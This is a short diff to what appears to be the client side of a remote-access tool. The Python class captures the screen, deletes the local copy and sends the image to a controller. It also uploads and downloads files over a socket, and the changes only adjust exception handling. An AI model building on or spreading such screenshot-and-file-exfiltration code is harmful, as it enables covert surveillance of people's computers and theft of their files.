@@ -36,12 +36,12 @@ class Client(object):
             self.receiveFile(header)
             self.sendHeader({"content": f"File {Path(args).stem} uploaded successfully!", "sucess": True})
 
-        except Exception as err:
-            self.sendHeader({"content": err, "sucess": False})
+        except PermissionError:
+            self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
 
     def screenshot(self, args):
         grab().save(self.screenshotPath)
-        namefile, extension, file = self.splitFile(self.screenshotPath)
+        namefile, extension, file = self.splitFile(self.screenshotPath);del(namefile)
         self.removeScreenshot()
         
         header = {
@@ -70,12 +70,11 @@ class Client(object):
                 self.sendHeader(header)
                 sleep(1)
                 self.__Client.send(file)
-
             else:
                 self.sendHeader({"content": f"File {Path(args).stem} not found", "sucess": False})
 
-        except Exception as err:
-            self.sendHeader({"content": err, "sucess": False})
+        except PermissionError:
+            self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
 
     def saveReceivedFile(self, path, content):
         with open(path, 'wb') as receivedFile:
